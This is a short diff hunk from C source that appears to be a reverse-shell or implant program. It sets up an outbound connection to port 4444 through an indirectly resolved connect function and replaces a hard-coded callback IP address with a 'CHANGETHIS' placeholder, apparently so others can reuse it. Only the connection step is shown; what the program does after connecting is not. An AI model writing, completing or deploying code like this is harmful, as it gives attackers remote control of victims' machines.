@@ -22,7 +22,7 @@ int main()
     struct sockaddr_in addr;
     addr.sin_family = AF_INET;
     addr.sin_port = htons(4444);
-    addr.sin_addr.s_addr = inet_addr("51.20.51.251");
+    addr.sin_addr.s_addr = inet_addr("CHANGETHIS");
 
     if (pConnect(sock, (struct sockaddr *)&addr, sizeof(addr)) == SOCKET_ERROR)
     {
